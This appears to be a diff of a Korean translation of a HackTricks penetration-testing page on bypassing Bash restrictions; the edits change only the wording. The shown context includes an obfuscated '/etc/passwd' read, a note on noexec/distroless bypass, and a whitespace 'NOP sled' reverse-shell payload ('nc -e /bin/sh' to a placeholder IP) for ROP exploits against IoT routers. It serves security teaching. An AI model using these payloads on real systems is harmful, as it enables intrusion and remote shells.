@@ -212,7 +212,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
-### 5자 RCE
+### 5자로 RCE
 ```bash
 # From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Oragnge Tsai solution
@@ -296,7 +296,7 @@ ln /f*
 ```
 ## Read-Only/Noexec/Distroless Bypass
 
-파일 시스템에 **읽기 전용 및 noexec 보호**가 있거나 심지어 distroless 컨테이너에 있는 경우에도 **임의의 바이너리, 심지어 셸을 실행할 수 있는 방법이 여전히 있습니다!:**
+파일 시스템이 **읽기 전용 및 noexec 보호**가 적용되어 있거나 심지어 distroless 컨테이너에 있는 경우에도 **임의의 바이너리, 심지어 셸을 실행할 수 있는 방법이 있습니다!:**
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
@@ -312,19 +312,19 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 취약점이 `system()` 또는 다른 셸에 도달하는 인수를 부분적으로 제어할 수 있게 해줄 때, 실행이 페이로드를 읽기 시작하는 정확한 오프셋을 알지 못할 수 있습니다. 전통적인 NOP 슬레드(예: `\x90`)는 셸 구문에서 **작동하지 않지만**, Bash는 명령을 실행하기 전에 선행 공백을 무해하게 무시합니다.
 
-따라서 실제 명령 앞에 긴 공백 또는 탭 문자의 시퀀스를 접두사로 추가하여 *Bash용 NOP 슬레드*를 만들 수 있습니다:
+따라서 실제 명령 앞에 긴 공백 또는 탭 문자의 시퀀스를 추가하여 *Bash용 NOP 슬레드*를 만들 수 있습니다:
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-만약 ROP 체인(또는 다른 메모리 손상 원시)이 명령 포인터를 공간 블록 내의 어느 곳에나 위치시키면, Bash 파서는 단순히 공백을 건너뛰고 `nc`에 도달하여 명령을 신뢰성 있게 실행합니다.
+ROP 체인(또는 기타 메모리 손상 원시)이 공간 블록 내의 어느 곳에든 명령 포인터를 배치하면, Bash 파서는 단순히 공백을 건너뛰고 `nc`에 도달하여 명령을 신뢰성 있게 실행합니다.
 
 실용적인 사용 사례:
 
 1. **메모리 매핑된 구성 블롭**(예: NVRAM)으로 프로세스 간에 접근 가능.
 2. 공격자가 페이로드를 정렬하기 위해 NULL 바이트를 쓸 수 없는 상황.
-3. 오직 BusyBox `ash`/`sh`만 사용 가능한 임베디드 장치 – 이들은 또한 선행 공백을 무시합니다.
+3. BusyBox `ash`/`sh`만 사용할 수 있는 임베디드 장치 – 이들은 또한 선행 공백을 무시합니다.
 
 > 🛠️ 이 트릭을 `system()`을 호출하는 ROP 가젯과 결합하여 메모리 제약이 있는 IoT 라우터에서 익스플로잇의 신뢰성을 극적으로 증가시킵니다.
 
@@ -335,6 +335,6 @@ bypass-fs-protections-read-only-no-exec-distroless/
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
 - [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju)
 
-- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [버려진 하드웨어에서 제로 데이 익스플로잇하기 – Trail of Bits 블로그](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../banners/hacktricks-training.md}}
